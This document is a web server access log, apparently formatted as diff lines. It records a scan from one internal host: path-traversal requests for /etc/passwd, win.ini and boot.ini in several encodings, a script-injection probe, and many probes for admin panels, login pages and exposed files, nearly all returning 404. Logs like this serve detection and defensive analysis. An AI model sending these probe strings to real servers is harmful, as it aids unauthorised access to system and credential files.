+INFO:     192.168.31.2:49828 - "GET /scripts/fake.cgi?arg=/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/winnt/win.ini HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:49830 - "GET /../../../../../../../../../../../../etc/passwd HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:49842 - "GET /./../../../../../../../../../../../etc/passwd HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:49848 - "GET //../../../../../../../../../../../../etc/passwd HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:49858 - "GET /..../..../..../..../..../..../..../..../..../..../..../..../etc/passwd HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:49872 - "GET /../../../../../../../../../../../../etc/passwd HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:49880 - "GET /../../../../../../../../../../../../etc/passwd HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:49892 - "GET /./../../../../../../../../../../../etc/passwd HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:49900 - "GET /../../../../../../../../../../../../etc/passwd HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:49906 - "GET /././././././../../../../../etc/passwd HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:49908 - "GET /%25uff0e%25uff0e/%25uff0e%25uff0e/%25uff0e%25uff0e/%25uff0e%25uff0e/%25uff0e%25uff0e/%25uff0e%25uff0e/%25uff0e%25uff0e/%25uff0e%25uff0e/%25uff0e%25uff0e/%25uff0e%25uff0e/%25uff0e%25uff0e/%25uff0e%25uff0e/etc/passwd HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:49924 - "GET /scripts/fake.cgi?arg=/dir/../../../../../../etc/passwd HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:49930 - "GET /scripts/fake.cgi?arg=/dir/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:49938 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:49952 - "GET /menu.htm HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:49996 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:50010 - "GET ..%5C..%5C..%5C..%5C..%5C..%5Cwindows%5Cwin.ini HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:50024 - "GET ..%5C..%5C..%5C..%5C..%5C..%5Cwinnt%5Cwin.ini HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:50034 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:50044 - "GET /auth/login HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:50052 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:50054 - "GET /ui/ HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:50068 - "GET /ui/ HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:50084 - "GET /recoveryconsole/ HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:50094 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:50102 - "GET /VncViewer.jar HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:50112 - "POST / HTTP/1.0" 405 Method Not Allowed
+INFO:     192.168.31.2:50128 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:50144 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:50170 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:50174 - "GET /login.html HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:50182 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:50198 - "GET // HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:50214 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:50230 - "GET /mdm/web/login.htm HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:50238 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:50244 - "GET /logon.jsp HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:50256 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:50260 - "GET /officescan/console/html/common/l10n/l10n.global.js HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:50266 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:50270 - "GET /webapp/js/UI_String.en-US.js HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:50272 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:50280 - "GET /webpages/ HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:50294 - "GET /webpages/index.html HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:50298 - "GET /webpages/login.html HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:50314 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:50320 - "GET /nessus-check/tomcat_error_version.nasl HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:50322 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:50324 - "GET /ldap/cgi-bin/ldacgi.exe?Action=Substitute&Template=../../../../../boot.ini&Sub=LocalePath&LocalePath=enus1252 HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:50328 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:50342 - "GET /tos/index.php?user/login HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:50348 - "GET /tos/ HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:50358 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:50364 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:50366 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:50370 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:50374 - "GET /tightvnc-jviewer.jar HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:50382 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:50388 - "GET /VncViewer.jar HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:50394 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:50398 - "GET /spotfire/about.jsp HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:50414 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:50424 - "GET /jasperserver-pro/login.html HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:50434 - "GET c%3A%5Cboot.ini HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:50464 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:50470 - "GET /etc/passwd HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:50478 - "GET //etc/passwd HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:50480 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:50484 - "GET /js/macro_config.js HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:50490 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:50492 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:50500 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:50510 - "GET /auth/login HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:50524 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:50528 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:50540 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:50542 - "GET /brightmail/viewLogin.do HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:50556 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:50560 - "POST /webui/apps/sdcss HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:50564 - "GET /.svn/entries HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:50568 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:50580 - "GET /index.jsp HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:50586 - "GET /index.JSP HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:50590 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:50598 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:50600 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:50602 - "GET /idm/login.jsp?lang=en&cntry= HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:50610 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:50614 - "GET /config-browser/showJars.xhtml HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:50618 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:50620 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:50634 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:50650 - "GET /login HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:50666 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:50668 - "GET /userportal/webpages/myaccount/login.jsp HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:50684 - "GET /webconsole/webpages/login.jsp HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:50688 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:50704 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:50714 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:50718 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:46664 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:46678 - "GET /api/sonicos/is-sslvpn-enabled HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:46694 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:46700 - "GET /sgms/login HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:46712 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:46722 - "GET /login.html HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:46736 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:46748 - "GET //admincp/login.php HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:46754 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:46758 - "GET /index.html HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:46762 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:46774 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:46776 - "GET /solr/%23 HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:46788 - "GET /%23 HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:46790 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:46796 - "GET /helpdesk/WebObjects/Helpdesk.woa HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:46802 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:46814 - "GET /swvm/ConsoleContainer.jsp HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:46818 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:46834 - "GET /api2/Localization/SolarWinds.Orion.SamAppOptics.Strings.dll HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:46846 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:46852 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:46868 - "GET /Orion/Login.aspx HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:46880 - "GET /Orion/Login.asp HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:46888 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:46898 - "GET /lem/index.html HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:46910 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:46914 - "POST /av-centerd HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:46930 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:46932 - "GET /brightmail/login.do HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:46942 - "GET /sitemap.xml HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:46954 - "GET /sitemap/sitemap.xml HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:46958 - "GET /map/sitemap.xml HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:46970 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:46982 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:46986 - "GET /SilverStream/Meta/Tables/?access-mode=text HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:47000 - "GET /SilverStream HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:47012 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:47024 - "GET /polarion/ HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:47036 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:47050 - "GET /stream/0 HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:47058 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:47064 - "GET /content/IHO4dbmxOj.mp3 HTTP/1.0" 404 Not Found
+INFO:     192.168.31.2:47078 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:47080 - "GET /tarantella/cgi-bin/secure/ttawlogin.cgi/?action=bootstrap HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:47084 - "GET /servlet/com.newatlanta.servletexec.JSP10Servlet HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:47090 - "GET /servlet/com.newatlanta.servletexec.JSP10Servlet/..%5C..%5Cglobal.asa HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:47096 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:47106 - "GET /SchneiderUPS/ HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+INFO:     192.168.31.2:42844 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:42854 - "HEAD /someunexistantstuff1089792642615531355.html HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:42864 - "HEAD /someunexistantstuff.exe HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:42872 - "GET /someunexistantantsutff12359687491117445380.html HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:42874 - "GET /someunexistantantsutff.exe HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:43146 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:43162 - "GET //wbm/login/ HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:57366 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:57382 - "GET /Portal/Portal.mwsl?MainSelection=USFW&TabSelection=NONE&ClientArea=/Portal/usfw-login.mwsl&DataFile=NONE&TemplateFile=NONE HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:57444 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:57440 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:57448 - "GET /home.htm HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:57462 - "GET /InitialPage.asp HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:42556 - "GET /home.asp HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:42596 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:42604 - "GET /index.html HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:42624 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:42626 - "GET /no_such_file__oDp6qxo.html HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:42630 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:42646 - "GET /plc/webvisu.htm HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:42668 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:42682 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:57896 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:57900 - "GET /html/iscscada.htm HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:57908 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:57914 - "GET /OEMSettings.ini HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:57930 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:57938 - "GET /web/status/sys.overview HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:57944 - "GET /web/signin HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:57958 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:57970 - "GET /main/web/status/ HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:57976 - "GET /broadWeb/bwRoot.asp HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:57988 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:57998 - "GET /sc3/console.php?psid=101 HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:58012 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:58016 - "GET /iView3/pages/version.frag HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:58024 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:58026 - "GET /SAPHostControl/?wsdl HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:58030 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:58036 - "POST /sawmillcl.exe HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:58042 - "GET /sawmillcl.exe?ho+{COMPLETE_VERSION} HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:58050 - "POST /sawmill6cl.exe HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:58058 - "GET /sawmill6cl.exe?ho+{COMPLETE_VERSION} HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:58064 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:58074 - "POST / HTTP/1.1" 405 Method Not Allowed
+INFO:     192.168.31.2:58076 - "GET /sapmc/sapmc.html HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:58086 - "GET /?ho+{COMPLETE_VERSION} HTTP/1.1" 200 OK
+INFO:     192.168.31.2:58102 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:58112 - "GET /AdminTools/querybuilder/nn.jsp HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:58128 - "GET /search/results.stm HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:58132 - "GET /WebID/IISWebAgentIF.dll?postdata="><script>foo</script> HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:58134 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:58148 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:58160 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:58168 - "GET /login HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:58174 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:58176 - "GET /apps/zxtm/login.cgi HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:58192 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:58204 - "GET /vncviewer.jar HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:58218 - "GET /names.nsf/view?ReadDesign HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:58226 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:58242 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:58246 - "GET /api/version HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:58252 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:58264 - "GET /index.html HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:58272 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:58276 - "GET /am_bin/amlogin HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:58278 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:58290 - "GET /cgi-bin/client_execute.cgi?tUD=0 HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:58304 - "GET /wrcontrollite.ssi HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:58320 - "GET /login1.htm HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:58332 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:58344 - "GET /login.html?1600 HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:58350 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:58354 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:58368 - "GET /eyespyfx_large.jsp HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:58380 - "GET /cgi-bin/authLogin.cgi HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:58390 - "GET /cgi-bin/guestimage.html HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:58400 - "GET /pda/ HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:58402 - "GET /ivc2/Backup/IVC1/html/index.htm HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:58404 - "GET /view/hsrindex.shtml HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:58410 - "GET /Webcam/webcam.html HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:58424 - "GET /cgi-bin/camctrl.cgi HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:58438 - "GET /cgi-bin/ctrldirect.cgi HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:58442 - "GET /user_view_S.htm HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:58458 - "GET /ViewerFrame?Mode=Motion HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:58460 - "GET /app/idxasp.html HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:58476 - "GET /view/index.shtml HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:58480 - "GET /view/view.shtml HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:58484 - "GET /main.cgi?next_file=main.htm HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:58500 - "GET /view.html HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:58506 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:58512 - "GET /cgi-bin/authLogin.cgi HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:58526 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:58530 - "GET /photo/lang/ENG.js HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:58542 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:58558 - "GET /1756331042/facts/192.168.8.229 HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:58570 - "GET /1756331042/certificate/192.168.8.229 HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:58580 - "GET /v2.0/environments/192.168.8.229 HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:58586 - "GET /puppet-ca/v1/certificate/192.168.8.229 HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:58590 - "GET /puppet/v3/facts/192.168.8.229 HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:58594 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:58610 - "GET /cas/login HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:58624 - "GET /auth/login HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:58638 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:58644 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:58646 - "GET /NmConsole/ HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:58648 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:58660 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:58664 - "GET /cgi-bin/printenv HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:58672 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:58684 - "GET /progs/homepage HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:35864 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:35878 - "GET /homepage/auth/login HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:35890 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:35906 - "GET /auth.html?mode=login HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:35910 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:35924 - "GET /login HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:35938 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:35952 - "GET /index.php?app=main&inc=core_auth&route=login HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:35958 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:35974 - "GET /admin/ HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:35998 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:36014 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:36020 - "GET /cgi-bin/pdesk.cgi?lang=../../../../../../../../etc/passwd%00 HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:36032 - "GET /html/en/index.htm HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:36044 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:36062 - "GET /login HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:36048 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:36074 - "GET //perl?-v HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:36084 - "GET //perl.exe?-v HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:36100 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:36106 - "GET /admin HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:36122 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:36126 - "GET /admin HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:36136 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:36152 - "GET /owncloud/index.php/login HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:36168 - "GET /login.htm HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:36176 - "GET /exchweb/bin/auth/owalogon.asp?url=http://12345678910 HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:36180 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:36186 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:36200 - "GET /ccm/console.tcl HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:36206 - "GET /av/api/1.0/system/local/tasks HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:36222 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:36226 - "GET /otrs/index.pl HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:36240 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:36250 - "GET /geoserver/web/ HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:36254 - "GET /geoserver/web/?0 HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:36262 - "GET /geoserver/web/wicket/bookmarkable/org.geoserver.web.AboutGeoServerPage HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:36278 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:36290 - "GET /.DS_Store HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:36300 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:36312 - "GET /ws_utc/login.do HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:36318 - "GET /wls_utc/ HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:36324 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:36330 - "GET /cs/idcplg?IdcService=GET_ENVIRONMENT&IsJson=1 HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:36338 - "GET /idc/idcplg?IdcService=GET_ENVIRONMENT&IsJson=1 HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:36344 - "GET //idcplg?IdcService=GET_ENVIRONMENT&IsJson=1 HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:56336 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:56338 - "GET /web-determinations/?CookieSet=true HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:56350 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:56354 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:56368 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:56376 - "GET /sgdadmin/faces/jsp/Version.jsp HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:56384 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:56400 - "GET /gateway/login HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:56402 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:56408 - "GET /portal/page/portal/Design_Time_PG/Welcome HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:56418 - "GET /page/portal/Design_Time_PG/Welcome HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:56432 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:56442 - "GET /mapviewer/omserver?getv=t HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:56452 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:56458 - "GET /portal/pls/portal/PORTAL_DEMO.ORG_CHART.SHOW HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:56470 - "GET /portal/pls/portal/DEV_PORTAL_DEMO.ORG_CHART.SHOW HTTP/1.1" 404 Not Found
